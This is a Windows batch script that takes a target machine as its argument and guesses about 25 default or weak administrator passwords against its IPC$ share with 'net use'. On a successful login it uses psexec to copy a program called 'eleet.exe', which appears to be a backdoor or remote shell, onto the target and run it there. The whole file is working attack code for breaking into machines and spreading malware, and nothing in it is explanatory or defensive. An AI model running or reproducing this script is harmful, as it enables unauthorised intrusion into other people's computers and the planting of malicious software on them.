@echo off
net use \\%1\ipc$ "" /user:Administrator
if not errorlevel 1 goto r1
net use \\%1\ipc$ "Administrator" /user:Administrator
if not errorlevel 1 goto r2
net use \\%1\ipc$ "test" /user:Administrator
if not errorlevel 1 goto r3
net use \\%1\ipc$ "test" /user:test
if not errorlevel 1 goto r4
net use \\%1\ipc$ "test123" /user:Administrator
if not errorlevel 1 goto r5
net use \\%1\ipc$ "temp" /user:Administrator
if not errorlevel 1 goto r6
net use \\%1\ipc$ "temp123" /user:Administrator
if not errorlevel 1 goto r7
net use \\%1\ipc$ "pass" /user:Administrator
if not errorlevel 1 goto r8
net use \\%1\ipc$ "password" /user:Administrator
if not errorlevel 1 goto r9
net use \\%1\ipc$ "admin" /user:Administrator
if not errorlevel 1 goto r10
net use \\%1\ipc$ "root" /user:root
if not errorlevel 1 goto r11
net use \\%1\ipc$ "changeme" /user:Administrator
if not errorlevel 1 goto r12
net use \\%1\ipc$ "admin" /user:admin
if not errorlevel 1 goto r13
net use \\%1\ipc$ "123456" /user:Administrator
if not errorlevel 1 goto r14
net use \\%1\ipc$ "654321" /user:Administrator
if not errorlevel 1 goto r15
net use \\%1\ipc$ "abc123" /user:Administrator
if not errorlevel 1 goto r16
net use \\%1\ipc$ "red123" /user:Administrator
if not errorlevel 1 goto r17
net use \\%1\ipc$ "admin123" /user:Administrator
if not errorlevel 1 goto r18
net use \\%1\ipc$ "qwerty" /user:Administrator
if not errorlevel 1 goto r19
net use \\%1\ipc$ "asdf" /user:Administrator
if not errorlevel 1 goto r20
net use \\%1\ipc$ "password123" /user:Administrator
if not errorlevel 1 goto r21
net use \\%1\ipc$ "secret" /user:Administrator
if not errorlevel 1 goto r22
net use \\%1\ipc$ "qwertyuiop" /user:Administrator
if not errorlevel 1 goto r23
net use \\%1\ipc$ "12345" /user:Administrator
if not errorlevel 1 goto r24
net use \\%1\ipc$ "54321" /user:Administrator
if not errorlevel 1 goto r25
goto end
:r1
psexec \\%1 -u Administrator -p "" -d attrib.exe -r eleet.exe
psexec \\%1 -u Administrator -p "" -f -c -d eleet.exe -o
psexec \\%1 -u Administrator -p "" -d eleet.exe -o
goto end
:r10
psexec \\%1 -u Administrator -p "admin" -d attrib.exe -r eleet.exe
psexec \\%1 -u Administrator -p "admin" -f -c -d eleet.exe -o
psexec \\%1 -u Administrator -p "admin" -d eleet.exe -o
goto end
:r2
psexec \\%1 -u Administrator -p "administrator" -d attrib.exe -r eleet.exe
psexec \\%1 -u Administrator -p "administrator" -f -c -d eleet.exe -o
psexec \\%1 -u Administrator -p "administrator" -d eleet.exe -o
goto end
:r11
psexec \\%1 -u root -p "root" -d attrib.exe -r eleet.exe
psexec \\%1 -u root -p "root" -f -c -d eleet.exe -o
psexec \\%1 -u root -p "root" -d eleet.exe -o
goto end
:r13
psexec \\%1 -u admin -p "admin" -d attrib.exe -r eleet.exe
psexec \\%1 -u admin -p "admin" -f -c -d eleet.exe -o
psexec \\%1 -u admin -p "admin" -d eleet.exe -o
goto end
:r3
psexec \\%1 -u administrator -p "test" -d attrib.exe -r eleet.exe
psexec \\%1 -u administrator -p "test" -f -c -d eleet.exe -o
psexec \\%1 -u administrator -p "test" -d eleet.exe -o
goto end
:r4
psexec \\%1 -u test -p "test" -d attrib.exe -r eleet.exe
psexec \\%1 -u test -p "test" -f -c -d eleet.exe -o
psexec \\%1 -u test -p "test" -d eleet.exe -o
goto end
:r5
psexec \\%1 -u administrator -p "test123" -d attrib.exe -r eleet.exe
psexec \\%1 -u administrator -p "test123" -f -c -d eleet.exe -o
psexec \\%1 -u administrator -p "test123" -d eleet.exe -o
goto end
:r6
psexec \\%1 -u administrator -p "temp" -d attrib.exe -r eleet.exe
psexec \\%1 -u administrator -p "temp" -f -c -d eleet.exe -o
psexec \\%1 -u administrator -p "temp" -d eleet.exe -o
goto end
:r7
psexec \\%1 -u administrator -p "temp123" -d attrib.exe -r eleet.exe
psexec \\%1 -u administrator -p "temp123" -f -c -d eleet.exe -o
psexec \\%1 -u administrator -p "temp123" -d eleet.exe -o
goto end
:r8
psexec \\%1 -u administrator -p "pass" -d attrib.exe -r eleet.exe
psexec \\%1 -u administrator -p "pass" -f -c -d eleet.exe -o
psexec \\%1 -u administrator -p "pass" -d eleet.exe -o
goto end
:r9
psexec \\%1 -u administrator -p "password" -d attrib.exe -r eleet.exe
psexec \\%1 -u administrator -p "password" -f -c -d eleet.exe -o
psexec \\%1 -u administrator -p "password" -d eleet.exe -o
goto end
:r12
psexec \\%1 -u administrator -p "changeme" -d attrib.exe -r eleet.exe
psexec \\%1 -u administrator -p "changeme" -f -c -d eleet.exe -o
psexec \\%1 -u administrator -p "changeme" -d eleet.exe -o
goto end
:r14
psexec \\%1 -u administrator -p "123456" -d attrib.exe -r eleet.exe
psexec \\%1 -u administrator -p "123456" -f -c -d eleet.exe -o
psexec \\%1 -u administrator -p "123456" -d eleet.exe -o
goto end
:r15
psexec \\%1 -u administrator -p "654321" -d attrib.exe -r eleet.exe
psexec \\%1 -u administrator -p "654321" -f -c -d eleet.exe -o
psexec \\%1 -u administrator -p "654321" -d eleet.exe -o
goto end
:r16
psexec \\%1 -u administrator -p "abc123" -d attrib.exe -r eleet.exe
psexec \\%1 -u administrator -p "abc123" -f -c -d eleet.exe -o
psexec \\%1 -u administrator -p "abc123" -d eleet.exe -o
goto end
:r17
psexec \\%1 -u administrator -p "red123" -d attrib.exe -r eleet.exe
psexec \\%1 -u administrator -p "red123" -f -c -d eleet.exe -o
psexec \\%1 -u administrator -p "red123" -d eleet.exe -o
goto end
:r18
psexec \\%1 -u administrator -p "admin123" -d attrib.exe -r eleet.exe
psexec \\%1 -u administrator -p "admin123" -f -c -d eleet.exe -o
psexec \\%1 -u administrator -p "admin123" -d eleet.exe -o
goto end
:r19
psexec \\%1 -u administrator -p "qwerty" -d attrib.exe -r eleet.exe
psexec \\%1 -u administrator -p "qwerty" -f -c -d eleet.exe -o
psexec \\%1 -u administrator -p "qwerty" -d eleet.exe -o
goto end
:r20
psexec \\%1 -u administrator -p "asdf" -d attrib.exe -r eleet.exe
psexec \\%1 -u administrator -p "asdf" -f -c -d eleet.exe -o
psexec \\%1 -u administrator -p "asdf" -d eleet.exe -o
goto end
:r21
psexec \\%1 -u administrator -p "password123" -d attrib.exe -r eleet.exe
psexec \\%1 -u administrator -p "password123" -f -c -d eleet.exe -o
psexec \\%1 -u administrator -p "password123" -d eleet.exe -o
goto end
:r22
psexec \\%1 -u administrator -p "secret" -d attrib.exe -r eleet.exe
psexec \\%1 -u administrator -p "secret" -f -c -d eleet.exe -o
psexec \\%1 -u administrator -p "secret" -d eleet.exe -o
goto end
:r23
psexec \\%1 -u administrator -p "qwertyuiop" -d attrib.exe -r eleet.exe
psexec \\%1 -u administrator -p "qwertyuiop" -f -c -d eleet.exe -o
psexec \\%1 -u administrator -p "qwertyuiop" -d eleet.exe -o
goto end
:r24
psexec \\%1 -u administrator -p "12345" -d attrib.exe -r eleet.exe
psexec \\%1 -u administrator -p "12345" -f -c -d eleet.exe -o
psexec \\%1 -u administrator -p "12345" -d eleet.exe -o
goto end
:r25
psexec \\%1 -u administrator -p "54321" -d attrib.exe -r eleet.exe
psexec \\%1 -u administrator -p "54321" -f -c -d eleet.exe -o
psexec \\%1 -u administrator -p "54321" -d eleet.exe -o
goto end
:end
